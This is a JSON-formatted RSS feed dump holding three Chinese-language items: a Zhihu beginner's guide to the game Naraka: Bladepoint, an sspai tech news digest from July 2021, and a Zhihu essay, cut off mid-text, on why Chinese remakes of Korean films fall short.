[{"title":"新手入坑《永劫无间》需要学会什么？","date":"2021-07-09 03:00:13","description":"\n<p>作为半个新手，给新手最大的建议就是——</p>\n<p><b>趁着现在刚开始，快去多玩玩体验体验吧</b></p>\n<p>可以说在<b>“大家都是初学者”</b>的这个起始阶段，对游戏的体验也应该是最友好的，等到后面很多玩家天赋什么的点满了、练度很高了再去玩，游戏体验落差就会很大了。</p>\n<p>在这里展示一下现在的<b>“游戏体验”</b>:</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3f4a2969baf5e6aa7b8ee90c07b2848_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"因为预购了妖刀姬，所以现在玩的两把也都在用她\" data-watermark=\"watermark\" data-original-src=\"v2-b3f4a2969baf5e6aa7b8ee90c07b2848\" data-watermark-src=\"v2-423977569e9bcc0bbbd69f097c8d2204\" data-private-watermark-src=\"v2-4b7f4a9257e0b5871f449dfa7b743ed0\"></p>\n<p><br></p>\n<hr>\n<p>好下面我也结合之前玩demo版和今天的官网版来讲一下我自己的个人经验，这些经验应该也是个人认为对新手有所帮助的了:</p>\n<p><b>PS：</b>现在的优化比当时的demo版好很多了</p>\n<p>在玩游戏之前，一定要明白这个游戏的本质：</p>\n<p><b>1.FPS？非FPS?</b></p>\n<p>首先来说一下的武器系统，这也是《永劫无间》和现在其他大逃杀游戏最为不同的点之一：在游戏中<b>近战武器</b>也占有相当的比例，而因为是武侠风，游戏的<b>远程武器</b>也多为箭弩铳炮这类的存在（要考虑下坠了）</p>\n<p>所以说这个游戏给很多不太擅长FPS而喜爱格斗类的玩家创造了机会，尤其常规的远程武器（喷火筒这样的除外）在被人近战黏上的时候也是捉襟见肘，所以在<b>单排</b>期间，即便是擅长FPS的玩家建议也是装配<b>一把近战武器一件远程武器</b>为上。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-95a0e3fd2cea9380c8565bc361775ba6_720w.jpg?rss\" data-rawwidth=\"1751\" data-rawheight=\"819\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-95a0e3fd2cea9380c8565bc361775ba6\" data-watermark-src=\"v2-ded1301266f7c32c990fbeb0c8cfc8c0\" data-private-watermark-src=\"v2-e8f8bb6f20e645a126e1f20f63d987a9\"></p>\n<p><b>2.游戏内符文——魂玉</b></p>\n<p>而另一点和其他大逃杀不同的在于这个游戏中有一个内置的魂玉系统，分为<b>属性魂玉</b>（加防加攻等）、<b>特殊魂玉</b>（加速冷却、减少消耗等）、<b>近战武器魂玉</b>（给特定的近战武器加成等）和<b>远程武器魂玉</b>（给特定的远程武器加成等）这四大类。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3839349e7da0252dca20161520314048_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"同时建议先去自由练习那里熟悉一下游戏内的各种内容\" data-watermark=\"watermark\" data-original-src=\"v2-3839349e7da0252dca20161520314048\" data-watermark-src=\"v2-ca71ca9ffbd7f594ecce755602ad1f3e\" data-private-watermark-src=\"v2-772e7a2aa81224251c15ee09f062624b\"></p>\n<p>其实分清楚这几大类之后也没什么好讲的了，因为在游戏中主要捡拾装配的就是<b>【属性魂玉】</b>这一种，个人习惯就是近抗、远抗、然后剩下全加攻。</p>\n<p>另外就是别装配跟自己所持武器无关的魂玉，就好比你看到有个远程武器魂玉，但是你手里全是近战武器，又或者你看到的魂玉是给阔剑加成的，而你手里是两把太刀，那这种就没有必要了（除非你专门为了魂玉换武器）。</p>\n<p>而魂玉的获得途径主要也是四种：1.从魂玉点（和装备点不一样，魂玉点是绿色的一堆）获得；2.从装备点或地上捡获得；3.从地图内的商店（普通商店和飓风客）那里购买；4.从敌人的包里拿。</p>\n<p><b>3.游戏内商店——货郎</b></p>\n<p>当然了“买点”这个设定就不是很稀奇了，像《使命召唤：战区》里也有类似的设定，玩家在搜集金币之后可以去购买所需的装备。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-460f34873107fafaf25bf35d8f0e55d4_720w.jpg?rss\" data-rawwidth=\"1590\" data-rawheight=\"739\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-460f34873107fafaf25bf35d8f0e55d4\" data-watermark-src=\"v2-031f967d2098daca1fed72e63fe6ca22\" data-private-watermark-src=\"v2-4b52b021d8350108f1725a2c871e7a6a\"></p>\n<p>这里需要提一下的就是飓风客这种定时不定点刷新的买点，可以说去飓风客这里获取装备是一种“赌命行为”，因为这个买点太过扎眼，很容易被群起而攻之或者被埋伏偷袭，但是奖励太过丰厚（高等级装备且免费），确实值得一搏，毕竟搏一搏单车变摩托。</p>\n<p>拿完就跑真的刺激！</p>\n<p><b>4.走位、突击、脱战——飞索</b></p>\n<p>而这个游戏最有乐趣的一个设定大概就是飞索了，因为近战远程武器以及技能的这些多样设定，使得这个游戏其实很难做到像其他大逃杀游戏中“把人秒了”，而和人战斗普遍也都是近距离（近战）或者中近距离（近战/远程），如果身法足够，打不过就跑也是能够做到的。</p>\n<p>而飞索则是一个能够<b>迅速让玩家拉近距离加入战团、勾住敌人乘胜追击或者在状态不行时及时脱战的装备。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-31730def3ee9b1db15310e9f6c2061c2_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31730def3ee9b1db15310e9f6c2061c2\" data-watermark-src=\"v2-a5b76afba6110d66471db1d1dd9c9f0c\" data-private-watermark-src=\"v2-36980f9ea244a5b24621eb14fbe53c21\"></p>\n<p>飞索的原本按键是Q（发动）+左键（锁定），不过我个人根据个人习惯改成了鼠标下侧键+左键。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7fd631a56720e72c92ef066b8d04e95c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7fd631a56720e72c92ef066b8d04e95c\" data-watermark-src=\"v2-de5b9a3b8f434c641ab4ef8a8fc4d116\" data-private-watermark-src=\"v2-deae49417ae25f969bf7da8bc8f9377e\"></p>\n<p><b>PS：</b>不能自定义多键对应一动作是真的难受，这一点真的强烈希望网易进行一下改进。</p>\n<p>可以说飞索是在这个游戏中除了基本战斗操作外最重要的一点（一定要学好），灵活的身法有时候是可以弥补一定的战斗劣势的。</p>\n<p>而除了飞索之外，游戏中的加速走位方式同样也有滑铲（这个应该很多玩家都很熟悉，像《使命召唤：战区》、《APEX英雄》都有滑铲这一动作），不过个人感觉滑铲存在的问题和飞索类似，在《永劫无间》里将Ctrl键和C键分做了不同用处，有点破坏玩家习惯。</p>\n<p><b>PS：</b>Ctrl竟然是慢走！慢走！慢走！为什么我要在大逃杀游戏里慢走?我就算躲人我蹲着走不行么?</p>\n<p><b>5.装备容量</b></p>\n<p>上面也提到过这个游戏是很难秒人的，所以在大部分情况下，护甲的需求都是远高于血量的需求的，所以护甲药的需求量也要比血药高很多。</p>\n<p>个人习惯的话，在最终阶段就是大护甲药保持4-6个，大血药保持2个（因为一般都没命打），飞索保持12-18个，剩下的则是装备匣。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-57ca514653deac50115137a70d4fbfd9_720w.jpg?rss\" data-rawwidth=\"353\" data-rawheight=\"224\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57ca514653deac50115137a70d4fbfd9\" data-watermark-src=\"v2-c3ab50c016d3c344bc312c21886464f7\" data-private-watermark-src=\"v2-52fc03b30f4e63cf577f47c1591b1341\"></p>\n<p><b>6.换弹？修复武器——装备匣</b></p>\n<p>装备匣应该也算是这个游戏中比较特殊的一点，因为在游戏中无论是近战武器还是远程武器，进行战斗都会有所消耗（消耗到0时就用不了了），而装备匣就是用于修补消耗值的。</p>\n<p>而装备匣的对应按键就是寻常大逃杀和FPS游戏上弹时的R键，所以这个游戏大概多少可以治好你的换弹癌（滑稽）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bab06783b80b8e53bcee11924d559f9e_720w.jpg?rss\" data-rawwidth=\"562\" data-rawheight=\"365\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bab06783b80b8e53bcee11924d559f9e\" data-watermark-src=\"v2-8612c27e0cba77be9143f8ccc948fc92\" data-private-watermark-src=\"v2-4d25fdbabd0310dd353c559dc4794f5a\"></p>\n<p><b>PS：</b>游戏中有一个魂玉的名字叫毕工淌就是搭配修复装备的，不过很少见是真的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac10886b97cce00b9c1a5ee8c969ccf0_720w.jpg?rss\" data-rawwidth=\"727\" data-rawheight=\"303\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ac10886b97cce00b9c1a5ee8c969ccf0\" data-watermark-src=\"v2-93b6979c253d3e83fe164acb716a2e6b\" data-private-watermark-src=\"v2-060ade94292acaf128486dd8cc6e5d0e\"></p>\n<p><b>7.近战须知——振刀</b></p>\n<p>把振刀理解成弹反即可，这也是在近战与敌人缠斗的时候一种极为有效的反击手段（振刀可以把敌人的武器打掉），鼠标左右键同事按或者按鼠标上侧键即可触发。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d4fe6546f655af95584e050e3dee8c11_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4fe6546f655af95584e050e3dee8c11\" data-watermark-src=\"v2-1c86d50ab149835c3185521df8e7485b\" data-private-watermark-src=\"v2-e3d8f06ec2e72e6f5ce7358106ad1abb\"></p>\n<p>严格来说这招我现在也没用熟练，不过这一招也确实算是除了飞索外最需要学会的一种手段（有奇效）。</p>\n<p><b>8.战术、意识</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-11498d4d1cb37a83041ffb3541ce8bec_720w.jpg?rss\" data-rawwidth=\"737\" data-rawheight=\"479\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-11498d4d1cb37a83041ffb3541ce8bec\" data-watermark-src=\"v2-b5bea30158b8594eb6395adde1d15c38\" data-private-watermark-src=\"v2-c555040d8464db496303e96592f10d45\"></p>\n<p>因为我的战斗水平并不是很强悍的那种，所以我在玩大逃杀游戏的时候也不喜欢莽上去直接加入别人混战的战团（因为这样很可能会成为别人混战的牺牲品）。</p>\n<p>而在《永劫无间》中，结合“飞索”、“很难秒人”这些特性，<b>“偷人”</b>本身也成了一种很常规的战术，等敌方两人消耗的差不多了自己使用飞索前去一顿输出收人头，然后事了拂衣去，深藏功与名。</p>\n<p><b>年轻人就该不讲武德（滑稽）。</b></p>\n<p>另外如果是多人组队的话，其实也可以注意一下阵容搭配（搭配一个奶）等。</p>\n<p><b>9.学习建议</b></p>\n<p>如果对游戏中的设定不太熟悉的话，其实建议在进行完开始的操作教学之后先去自由练习熟悉一下装备和魂玉，然后在去进阶教学体验上一小把，在这之后对游戏的理解就能深刻不少了。</p>\n<p>而在游戏中也有许多的小资源，例如消除脚步的蒲公英、回复护甲和血量的沙叻果，以及一些特殊的委派任务等等，这些格外的内容往往也会给游戏过程增加不少乐趣。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2af86c25564dfe7259854d54c5ed299d_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2af86c25564dfe7259854d54c5ed299d\" data-watermark-src=\"v2-43bb6b8bee1929537af205ac3b5e2c79\" data-private-watermark-src=\"v2-0d545f0ee10f7b51b4c26306bcdf4993\"></p>\n<p><br></p>\n<p>最后附上今中午刚刚打的一把：</p>\n<a href=\"https://www.zhihu.com/zvideo/1396505019567517696\">永劫无间：新手的快乐想象不到</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jin-xi-ri-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">锦曦日</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/276588849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新手教程都能死是一种什么体验？</a><br><a href=\"http://www.zhihu.com/question/264666086?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些游戏的新手教程的设计十分精彩/别出心裁？</a><br>\n","link":"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：萤石发布 BC2 电池摄像机、支付宝正式上线长辈模式等","date":"2021-07-09 01:00:00","description":"\n<h2>萤石发布 BC2 电池摄像机</h2>\n<p>7 月 8 日，萤石正式发布 BC2 电池摄像机，该摄像机采用了黑色小巧的外观设计，配备 200 万像素摄像头和 F1.6 大光圈，采用了 2000mAh 大电池，续航能力预计为 50 天，支持夜视能力以及高速唤醒抓拍，售价 399 元。<a href=\"https://weibo.com/3196768015/KnNMO097c\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/2327e7bc8fe732bd28ebb65818bc34f1\"></figure><h2>支付宝正式上线长辈模式</h2>\n<p>7 月 8 日，支付宝官方宣布，正式上线长辈模式的功能，该功能修改了原本的布局，采用了大图标大字体的设计，并去除了一些老年人不常用的功能和营销项目，用户可以通过搜索「长辈模式」进行开启，或在【我的】-【设置】中开启。<a href=\"https://weibo.com/1891502860/KnL4ma0Tz\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/eaade932c89b5503fc1551dc19076125.jpeg\"></figure><h2>高通华硕合作推出面向骁龙粉丝的手机</h2>\n<p>7 月 8 日，高通和华硕宣布合作打造 Smartphone for Snapdragon Insiders，包括了一部定制手机和一副由 Master &amp; Dynamic 公司生产的带有 Snapdragon Sound 音效的真无线耳机。</p>\n<p>手机采用了 6.78 寸 FHD+ 144Hz Super AMOLED 屏幕，最高亮度为 1200 nits；处理器方面搭载骁龙 888 处理器，配备 16GB LPDDR 5 和 512GB 存储，内置 4000mAh 电池，支持 Quick Charge 5 快充，这款手机还将保留 3.5mm 接口，售价是 1,499 美元。<a href=\"https://cn.engadget.com/qualcomm-asus-smartphone-snapdragon-insiders-163814518.html?guccounter=1\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/b8121b48e36540a3aaa7f7fe794a8a1d\"></figure><h2>腾讯将采用人脸识别技术进行未成年人防沉迷</h2>\n<p>7 月 8 日，腾讯即将引入全新的人脸识别系统开启「零点巡航」措施，来对未成年人的游戏时间段进行严格管控，避免未成年人在 22 点到次日 8 点的时间进行游戏，并弥补了实名制的不足性。<a href=\"http://www.sixthtone.com/news/1007915/tencent-deploys-facial-recognition-to-detect-minors-gaming-at-night-\" target=\"_blank\">来源</a></p>\n<h2>Pixel 6 系列最终规格泄露</h2>\n<p>知名报料人 Jon Prosser 于 7 月 8 日曝光了 Pixel 6 系列的最终硬件规格，首先 Pixel 6 屏幕为 6.4英寸的 AMOLED 屏幕，后置相机为 5000 万像素主摄+ 1200 万像素广角，前置则为 800 万像素，电池 4614mAh，运存为 8GB，内置存储为 128GB/256GB。</p>\n<p>更高阶的 Pixel 6 Pro 屏幕为 6.71 英寸的 AMOLED 屏幕，后置相机为 5000 万主摄 + 4800 万像素长焦 + 1200 万像素广角，前置位 1200万像素，电池 5000mAh，运存为 12GB，存储可选 128GB / 256GB / 512GB。</p>\n<p>两款手机都搭载了 Google 和三星合作的 Whitechapel 处理器，内置有定制的神经处理单元，运行最新的 Android 12 。<a href=\"https://www.phonearena.com/news/google-pixel-6-pixel-6-pro-leaked-specs-features_id133469\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/eb2d04df10fbf4e4775cc55f08fc2dfe\"></figure><h2>银保监会宣布 7 月 25 日调整 ATM 跨行取现手续费</h2>\n<p>在 7 月 8 日举行的国务院政策例行吹风会上，中国银行保险监督管理委员会、消费者权益保护局局长郭武平就「降低自动取款机跨行取现手续费」进展做出解答，表示跨行取现费率降低至每笔 3.5元，并将从 7 月 25 日开始正式实施。<a href=\"https://finance.sina.com.cn/roll/2021-07-08/doc-ikqciyzk4285309.shtml\" target=\"_blank\">来源</a></p>\n<h2>一加承认 9 系列手机会限制 App 性能</h2>\n<p>外媒 AnandTech 在测试一加 9 系列手机时发现，一加 9 会针对性地限制某些应用调用大核，从而运行某些软件时出现卡顿的情况，而在运行跑分软件时则全速运行。对此一加在 XDA 论坛对此进行了解释，由于两款手机都搭载了骁龙 888 导致了续航力不足，因此采用了分配不同核心的方式来延长电池续航时间，但也因此对跑分结果产生影响。<a href=\"https://cn.engadget.com/oneplus-9-pro-throttling-023004191.html\" target=\"_blank\">来源</a></p>\n<h2>华东师范大学和微软推出中文写作智能辅导系统「小花狮」</h2>\n<p>在 2021 世界人工智能大会「AI 赋能教育数字化转型论坛」上，微软亚洲研究院和华东师范大学共同签署了促进智能教育研究的合作备忘录，双方率先从语音教学入手，联合推出中文写作智能辅导系统「小花狮」，该系统将利用现有的中文教学知识的研究成功，结合自然语言处理，不仅可以让学生获得作文评分结果，还能让其了解评分背后的原因，持续改进学习方法，提升写作与阅读能力。同时人工智能技术也将辅助老师了解不同学生的特点，因材施教，实施更有针对性的教学。<a href=\"https://finance.sina.com.cn/chanjing/gsnews/2021-07-08/doc-ikqcfnca5686051.shtml\" target=\"_blank\">来源</a></p>\n<h2>微博支持国行 Nintendo Switch 一键分享</h2>\n<p>7 月 8 日，微博游戏官方宣布，微博现已支持腾讯引进 Nintendo Switch 分享功能，只用扫码登录微博即可绑定账号，后期选择截图或者视频即可分享。<a href=\"https://weibo.com/6613432328/KnLwvC714?type=comment#_rnd1625784783713\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67218\" target=\"_blank\">🎫 订票、选座、值机：为你解答那些关于机票的「为什么」</a></li>\n<li><a href=\"https://sspai.com/post/67586\" target=\"_blank\">✈️ 快乐飞旅行报告 08：汕头的牛肉能尝出甜味</a></li>\n<li><a href=\"https://sspai.com/post/67598\" target=\"_blank\">✏️ 一派·再读 05：互联网时代的创作</a></li>\n<li><a href=\"https://sspai.com/post/67612\" target=\"_blank\">🆕 新玩意 070｜少数派的编辑们最近买了啥？</a></li>\n<li><a href=\"https://sspai.com/post/67607\" target=\"_blank\">👉 27 万的 Model Y 来了，现在买特斯拉该怎么选</a></li>\n</ul>\n<p>&gt; 来聊聊你的 BGM，欢迎参加<a href=\"https://sspai.com/bullet/1625539421\" target=\"_blank\">「一派」讨论</a> 🎵</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67623"},{"title":"翻拍的电影电视剧为什么总是不尽如人意？","date":"2021-07-08 23:06:34","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/fca79cac273e40941b8a3777d85e162b_l.jpg?source=8673f162\"><span>吴怼怼，</span><span>左手科技互联网，右手文娱与消费</span>\n<a href=\"https://www.zhihu.com/question/319232516/answer/1984878012\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>张绍刚吐槽宝贝儿的那句「取其精华，变成糟粕」用来形容翻拍电影很贴切。</strong></p>\n<p>国产《阳光姐妹淘》上映后，这句话被再次印证。</p>\n<p>虽然为降低导演口碑对电影的影响，包贝尔这次低调得只在片尾用一小行字署名「导演包贝尔」，宣传电影时上的几个专访也都谨小慎微，尽量在讲对电影的热爱，讲自己普世且普通。</p>\n<p>但浓浓的求生欲并没能挽回《姐妹淘》的口碑。</p>\n<p>包贝尔本人拍电影功力不足是肯定的，不过作为翻拍电影，《阳光姐妹淘》的问题并不孤立。</p>\n<p>今年上映了《你的婚礼》《当男人恋爱时》，这些由韩国电影翻拍而来的片子，取得商业成功的同时，其实和《姐妹淘》一样，在本土化问题上，都犯了难。</p>\n<p>拉长时间线看，近年翻拍韩国电影的操作在电影市场十分频繁。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-984ef375b10cdd999ead30fe6d25858e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这是因为相比好莱坞 IP，韩国电影版权显然更便宜。且相比差异更大的欧美文化，日韩文化与中国文化背景更接近，改编更轻松，已经经受韩国市场检验的电影，按理说本土化后成功率会更高。</p>\n<p>但成功的公式并不好复制。</p>\n<p>除了《重返 20 岁》等少数叫好叫座的电影翻拍片外，大多数翻拍韩国的电影，境地都很尴尬，《比悲伤更悲伤的故事》高票房外引来对电影价值观的质疑，《小小的愿望》复制粘贴《伟大的愿望》却困于「技术原因」，《你的婚礼》在口碑本就平平的原作上再下一层楼……</p>\n<p>爱情、犯罪、悬疑、喜剧，明明选的都是最典型的商业类型，为什么翻拍韩国片这个看似保险的举动之下，全是深坑？</p>\n<p>绕不过「本土化」三个字。</p>\n<p>01.适配的背景</p>\n<p>翻开豆瓣评论，会发现韩版《阳光姐妹淘》里为人称道的情节，到了国产《阳光姐妹淘》里，广为诟病。典型如暴力的运用。</p>\n<p>韩版《阳光姐妹淘》里，打架是一大特色。看电影的人不会产生「这群女的虚度光阴不务正业打打杀杀」的违和感。</p>\n<p>因为故事发生的背景是 1980 年代的韩国，动荡的时局，充满暴力的社会，给校园暴力提供了普遍性与合理性。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bf0034e1c8298a04d396e6841823239b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>人物动机在时代背景下被合理化了，可信度就增加了。</strong></p>\n<p><strong>韩国社会几十年的变迁发展，与主人公成长息息相关，现实土壤是姐妹淘生长的暗线，主创团队对社会的理解和把握，让浮于空中的青春和女性议题，有了踏实的落脚点。</strong></p>\n<p>国产《阳光姐妹淘》的故事主要发生在 1997 年，包贝尔在接受「第一导演」专访时，说制片人李洪大在跟他签合同时，特别强调「原版的整体故事不能改动」。</p>\n<p>最终，他给出的本土化落地点，是一连串的怀旧金曲，贴满墙的 90 年代电影海报，外加暖黄回忆滤镜。这太浮于表面太单薄了。</p>\n<p>在保持原故事框架的基础上，能对接的本土化背景，其实有很多。</p>\n<p>1997 年原本是个很有历史纵深感的年份，《过春天》拍过香港货车司机到深圳养私生子，家庭不完整的孩子住在深圳，每天去新界上学，怕被孤立，拉帮结派、逃课，为赚生活费走私，她们的特殊青春有动荡，有打架、有走私。</p>\n<p>虽然出格，但合乎历史和情理。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-dd2a8ecdc2f93c65cc37b8f71f2d39a1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不止深圳，支援大西北的第一代人在西北扎根，儿孙们到了 2000 年前后重回南方故土，改革开放以后，北方人南下广州打工……</p>\n<p>这些真实历史背景里，关于「转学女孩水土不服」可挖掘的故事有很多，想要找一个对应到《阳光姐妹淘》里，没那么难。</p>\n<p>长大后的姐妹淘，因知识文化境遇不同，进入了不同阶级。而她们成年的这些年，也是互联网浪潮下国家高速发展的时期。</p>\n<p>草莽经济在退潮，斗狠斗勇的处世之道被淘汰，取而代之的是文明社会靠科技创意创新打天下。</p>\n<p>那种时代大浪淘沙后，不得不认命的无奈，《江湖儿女》中早有表现。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e420bbafedd639f352e27219a4bea315_720w.jpg?source=8673f162\" alt=\"\"></figure><p>明明从 1997 至今的这段时光，中国土壤中有那么多节点能大书特书，偏偏主创团队要纠结最浅表的怀旧元素，照猫画虎地让东北姑娘转学去到南方，用东北口音表现主人公的水土不服，要说不敷衍，实在不公正。</p>\n<p><strong>包贝尔们不去洞察中国社会，而是把精力集中在复刻原版上，下载韩版、日版、越南版《阳光姐妹淘》装进 ipad 里，拍摄现场带着，镜头全靠临摹。</strong></p>\n<p>等接受采访时，说出「在中国，我不确定有没有阶级这件事，可能有，但我不知道」这种话。这样的创作思路，本身就和好电影相去甚远。</p>\n<p>你看《误杀》也是翻拍，但柯汶利陈思诚他们，结合中国社会人情，做了多少细化，才把故事真正落地。</p>\n<p>用没用心，一清二楚。</p>\n<p>翻拍过程中，不把现实土壤当单位，谈何本土？</p>\n<p>02. 进一步探讨问题</p>\n<p>但就算写实，翻拍也不见得能做好。</p>\n<p>典型如《你的婚礼》。</p>\n<p>韩版是工整的青春爱情片，叙事工整，主题单一，算不上好片，但好歹及格。</p>\n<p>调皮捣蛋的男主对转学生女主一见钟情，开始了十年追爱之路。期间看到了女主破碎的家庭，为了追爱复读考上大学，服兵役期间为女主放弃考试，毕业后在一系列现实问题中，滋生出「如果没有遇见她，我的人生不会这么糟」的念头，从而断送了两个人的爱情。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2341de380d01561687ca564c7d2badd3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个故事深刻的点，不在于男主追爱多辛苦，而在于他以女主为重心心甘情愿过了那么多年后，反过来在人生不顺时，怪女主不给自己带来好运。</p>\n<p>这不是所谓的渣或不负责，而是人本来的劣根性。是亲密关系中过度付出后的反噬。</p>\n<p><strong>一个普世且值得探讨的点，原版立在青春片的类型里，抛出了问题，但没探讨，让本可以更出色的电影止步及格。</strong></p>\n<p>到了国产翻拍，男女主换了新名字，把打棒球的男主改成游泳，其他情节基本照搬，完成了剧本改编。</p>\n<p>这种 1:1 的复刻式翻拍，让原版优点疲软无力，在如今社交媒体「舔狗舔到最后一无所有」的风向里，男主十年追爱，被解构成一个自我感动的笑话。</p>\n<p>主创团队的惰性，要给电影表现力不足背锅。</p>\n<p>原版故事不是尽善尽美，意味着问题暴露了，改编时能够有更多发挥的空间。如果不用男主单一视角，用更客观的第三视角反映这个故事，那么观众看到的，至少是同龄女生始终比男生成熟的思考。</p>\n<p>就算沿用男主视角，跳出原版以追忆为主的叙事框架，改成反思，那么这个失去初恋的故事，就不再是加了回忆滤镜的自我感动。</p>\n<p><strong>男性视角对爱情的反思，也算是对现有国产爱情片的一种突破。</strong></p>\n<p>其实翻拍电影落地化，尤其翻拍爱情片，在原片不完美的情况下，翻拍只要注重解决问题，交出的答卷就不会差。</p>\n<p>而中国影视的现状，是在原版基础上，选有 cp 感的演员，选漂亮的拍摄地点，营销各种电影话题，但着力点不往剧作上放，想要观众买账，就很难。</p>\n<p><strong>翻拍本土化，差的不是创意，不是经费，不是表现力更好的演员，而是发现问题并解决问题的态度。</strong></p>\n<p>国产翻拍需要改变的是态度。</p>\n<p>创作团队要有吃透原作、发现问题、解决问题的意识，也要认清翻拍不是复读，虽然故事有框架，但翻拍有创新。</p>\n<p>03.话题性要落地点</p>\n<p>除了利用丰富的时代土壤，从原作中找到翻拍应该解决的问题，翻拍电影还有一个注意点，是选材。</p>\n<p>韩国电影有完善的分级制度，所以即使在青春片这个范畴里，也依然有更小的分支，如「性喜剧」。</p>\n<p>我国目前没有分级制度，这就意味着进入院线的电影，要在框定的范围足够普世。</p>\n<p>而这，要求选择翻拍片时，充分考虑原作主旨的丰富程度，以此来发掘创作的灵活性。</p>\n<p>《伟大的愿望》被翻拍时，主创团队看中的，是青少年谈「性」这个极具爆点的话题，这也是田羽生以往爱拍的题材，但在主角是成人的电影里含蓄地讨论，跟在主角是未成年人的电影里直白讨论，明显是两个范畴的话题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-be48c0c58164a19b59f876b382c717a7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《伟大的愿望》本土化成《小小的愿望》上映后，预告片中男主大喊想要破处的桥段，被生硬处理成「谈恋爱」。王中磊接受采访时袒露过，因技术原因、改名风波被撤档的《小小的愿望》，为了上映，补拍了不少镜头。</p>\n<p>《伟大的愿望》中青少年对性的态度在国内土壤受到阻隔，但更重要的是，创作团队止步于性，简单地将「变成男人」处理成「想谈恋爱」，在表达上，呈现全方位的疲软。</p>\n<p><strong>但其实，电影中除了性，突发的疾病、少年之间的情谊、父母与孩子之间的亲情，都可以成为电影的第二个发光点，在原作核心发光点与本土创作生态水土不服时，跳出来开辟新方向。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d208071b2769ebbcd865aedc33aa5c72_720w.jpg?source=8673f162\" 